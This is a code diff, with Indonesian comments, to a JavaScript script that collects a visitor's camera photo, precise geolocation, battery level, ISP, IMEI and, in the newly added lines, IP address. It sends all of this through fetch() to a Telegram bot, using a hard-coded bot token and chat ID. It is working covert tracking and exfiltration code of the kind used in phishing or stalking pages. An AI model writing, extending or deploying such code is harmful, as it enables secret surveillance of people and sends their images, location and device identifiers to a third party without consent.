@@ -53,7 +53,8 @@
             platform: navigator.platform,
             batteryLevel: null,
             isp: null, // Info ISP perangkat
-            imei: null // Info IMEI perangkat
+            imei: null, // Info IMEI perangkat
+            ipAddress: null // Alamat IP perangkat
           };
 
           // Mendapatkan informasi batrai perangkat
@@ -63,27 +64,34 @@
                 deviceInfo.batteryLevel = battery.level * 100;
                 deviceInfo.isp = getISPInfo(); // Memanggil fungsi untuk mendapatkan info ISP
                 deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
+                getIPAddress()
+                  .then(function(ipAddress) {
+                    deviceInfo.ipAddress = ipAddress;
 
-                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
-                var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-                var chatId = '1121369247';
+                    // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+                    var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+                    var chatId = '1121369247';
 
-                var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
-                var formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', dataURItoBlob(imageDataURL));
-                formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+                    var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+                    var formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', dataURItoBlob(imageDataURL));
+                    formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
 
-                fetch(url, {
-                  method: 'POST',
-                  body: formData
-                })
-                .then(function(response) {
-                  console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram.');
-                })
-                .catch(function(error) {
-                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram:', error);
-                });
+                    fetch(url, {
+                      method: 'POST',
+                      body: formData
+                    })
+                    .then(function(response) {
+                      console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram.');
+                    })
+                    .catch(function(error) {
+                      console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram:', error);
+                    });
+                  })
+                  .catch(function(error) {
+                    console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
+                  });
               })
               .catch(function(error) {
                 console.error('Gagal mendapatkan informasi batrai:', error);
